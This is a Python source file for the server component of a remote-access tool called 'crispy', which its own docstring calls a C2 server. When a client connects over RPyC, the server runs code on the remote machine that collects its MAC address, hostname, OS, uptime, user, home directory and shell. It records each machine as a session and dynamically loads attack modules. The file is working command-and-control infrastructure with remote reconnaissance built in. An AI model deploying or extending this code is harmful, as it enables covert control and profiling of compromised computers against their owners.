import ConfigParser
import crispy.modules
import logging
import pkgutil
import textwrap
import threading

logger = logging.getLogger(__name__)

from .. network.server_type import RPyCServer
from .. network.service import CrispyService
from . client import CrispyClient

class CrispyServer(threading.Thread):
    """ Backend server methods for clients. """

    def __init__(self, addr, port):
        super(CrispyServer, self).__init__()
        self.daemon = True
        self.addr = addr
        self.port = port
        self.srv = None

        self.clients = []
        self.clients_lock = threading.Lock()
        self.current_id = 1

    def add_client(self, conn):
        """ Add new client to client list. """
        logger.debug("add_session(conn) was called")
        
        _client_addr, _client_port = conn._conn._config['connid'].split(':')
        logger.info("Session {} opened ({}:{} <- {}:{})".format(self.current_id, self.addr, self.port, _client_addr, _client_port))
            
        conn.execute(textwrap.dedent(
        """
        import datetime
        import os
        import platform
        import re
        import subprocess
        import sys
        import uuid

        def enum():
            macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell = None, None, None, None, None, None, None, None, None, None

            try:
                macaddr = ':'.join(("%012x" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            except:
                pass

            try:
                hostname = platform.node()
            except:
                pass

            try:
                plat = "{} {}".format(platform.system(), platform.release())
            except:
                pass

            try:
                proc_type = platform.processor()
            except:
                pass

            try:
                proc_arch = platform.machine()
            except:
                pass

            try:
                if 'Windows' in platform.system():
                    uptime = "windows uptime"
                    #systeminfo | find "System Boot Time:"
                else:
                    uptime = ' '.join(re.split(' ', subprocess.check_output(['uptime']))[3:5])[:-1]
            except:
                pass

            try:
                date = str(datetime.datetime.now()).split('.')[0]
            except:
                pass

            try:
                user = os.getenv('USER')
            except:
                pass

            try:
                home = os.getenv('HOME')
            except:
                pass

            try:
                shell = os.getenv('SHELL')
            except:
                pass

            return (macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell)
            """))

        l = conn.namespace['enum']()

        with self.clients_lock:
            cc = CrispyClient({
                'conn'     : conn, 
                'id'       : self.current_id, 
                'ip'       : _client_addr, 
                'macaddr'  : l[0], 
                'hostname' : l[1], 
                'plat'     : l[2], 
                'proc_type': l[3], 
                'proc_arch': l[4], 
                'uptime'   : l[5], 
                'date'     : l[6], 
                'user'     : l[7], 
                'home'     : l[8], 
                'shell'    : l[9],
            })
            self.clients.append(cc)
            self.current_id += 1

    def remove_client(self, conn):
        """ Remove client from client list. """
        logger.debug("remove_client(conn) was called")
        
        with self.clients_lock:
            for index, client in enumerate(self.clients):
                if client.get_session() is conn:
                    del self.clients[index]
                    break

    def remove_client_id(self, id):
        """ Remove client given an id from client list. """
        logger.debug("remove_client_id(id) was called")
        
        with self.clients_lock:
            conn = self.get_client(id)
            conn.close()
            #self.clients.remove(self.get_client(id))
            self.clients.remove(conn)

    def remove_all(self):
        """ Remove all clients from list. """
        logger.debug("remove_all() was called")
        
        with self.clients_lock:
            for index, client in enumerate(self.clients):
                del self.clients[index]

    def get_client_list(self):
        """ Return a list of clients connected to the C2 server. """
        logger.debug("get_client_list() was called")
        
        return self.clients

    def get_client(self, id):
        """ Return client given session id. """
        logger.debug("get_client(id) was called")
        
        for client in self.clients:
            if client.get_id() == id:
                return client

    def get_module_list(self):
        """ Iterate over all modules. """
        logger.debug("get_module_list() was called")
        
        for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
            yield self.get_module(module_name)

    def get_module(self, name):
        """ Return a module by name. """
        logger.debug("get_module() was called")
        
        for module_loader, module_name, ispkg in pkgutil.iter_modules(crispy.modules.__path__):
            if module_name == name:
                module = module_loader.find_module(module_name).load_module(module_name)
                class_name = None
                
                if hasattr(module, "__class_name__"):
                    class_name = module.__class_name__
                
                return getattr(module, class_name)
    
    def run(self):
        try:
            self.srv = RPyCServer(CrispyService, hostname=self.addr, port=self.port)
            self.srv.start()
        except Exception as e:
            print e
